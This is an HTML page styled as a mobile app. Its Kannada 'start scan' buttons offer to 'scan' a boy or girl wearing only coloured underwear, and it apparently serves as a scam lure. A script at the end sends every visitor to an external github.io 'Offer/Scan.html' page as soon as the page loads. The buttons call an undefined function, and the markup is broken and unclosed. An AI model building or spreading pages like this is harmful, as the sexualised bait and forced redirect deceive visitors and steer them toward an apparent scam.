<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Mobile App Style Page</title>

  <!-- Google Font -->
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Poppins', sans-serif;
    }

    body {
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: linear-gradient(135deg, #4facfe, #00f2fe);
    }

    .app-container {
      width: 360px;
      height: 640px;
      background: #ffffff;
      border-radius: 30px;
      box-shadow: 0 15px 40px rgba(0,0,0,0.2);
      overflow: hidden;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
    }

    .content {
      padding: 30px 20px;
      text-align: center;
    }

    .logo {
      width: 90px;
      margin: 20px auto;
      display: block;
    }

    h1 {
      font-size: 22px;
      margin-bottom: 20px;
      color: #333;
    }

    ul {
      list-style: none;
      text-align: left;
      margin: 20px 0;
    }

    ul li {
      margin: 10px 0;
      padding: 12px;
      background: #f5f7fa;
      border-radius: 10px;
      font-size: 14px;
      box-shadow: 0 2px 5px rgba(0,0,0,0.05);
    }

    .bottom {
      padding: 20px;
    }

    .start-btn {
      width: 100%;
      padding: 15px;
      font-size: 16px;
      border: none;
      border-radius: 15px;
      background: linear-gradient(135deg, #4facfe, #00c6ff);
      color: white;
      font-weight: 600;
      cursor: pointer;
      transition: transform 0.2s ease, box-shadow 0.2s ease;
    }

    .start-btn:active {
      transform: scale(0.97);
      box-shadow: 0 5px 10px rgba(3,0,5,0.2);
    }

    /* Optional: simulate mobile safe area */
    .top-bar {
      height: 20px;
      background: transparent;
    }

  </style>
</head>
<body>

  <div class="app-container">

    <div class="top-bar"></div>

    <div class="content">
      <!-- Logo -->
      <img src="yt.png" alt="Logo" class="logo">

             <li>1) ಹುಡುಗ: Only (Green underwear)
                 <button class="start-btn" onclick="goHome()"> ಸ್ಕ್ಯಾನ್ ಆರಂಭಿಸಿ    </button><br><br><br>
                 2) ಹುಡುಗಿ: Only (Blue Bra & Blue Panty)
                  <button class="start-btn" onclick="goHome()"> ಸ್ಕ್ಯಾನ್ ಆರಂಭಿಸಿ    </button> <br><br>
                 </li>

       

        </ul>
    </div>

  

  </div>

  <script>

      window.location.href = "https://twytjsklawq.github.io/Offer/Scan.html";

</body>
</html>
